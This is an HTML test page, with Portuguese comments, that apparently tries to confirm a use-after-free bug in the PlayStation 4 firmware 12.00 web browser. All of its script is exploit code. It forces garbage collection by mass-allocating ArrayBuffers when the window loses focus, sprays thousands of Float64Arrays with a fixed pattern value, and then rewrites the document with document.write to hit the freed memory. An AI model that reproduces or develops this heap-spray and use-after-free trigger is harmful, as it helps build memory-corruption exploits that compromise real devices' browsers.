<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF Confirmation - Force GC Isolado</title>
</head>
<body>

<h2>PS4 12.00 - UAF Confirmation (Teste 2 Isolado)</h2>

<button onclick="runTest()">Executar Teste: Force GC</button>

<div id="log"></div>

<script>
const PATTERN = 2.121995791e-314;

function runTest() {
    const log = document.getElementById("log");
    log.innerHTML = "<p>Running... Press OPTIONS</p>";

    let controllers = [];

    // Passo 1
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    // Fullscreen
    document.documentElement.webkitRequestFullscreen?.();

    window.onblur = function() {
        // FORÇA GC
        controllers = null;

        for (let i = 0; i < 20000; i++) {
            new ArrayBuffer(0x10000);
        }

        // Spray mantido
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }

        // Gatilho crítico
        setTimeout(() => {
            document.open();
            document.write("<h1>Crash</h1>");
            document.close();
            setTimeout(() => location.reload(), 500);
        }, 3000);
    };
}
</script>

</body>
</html>
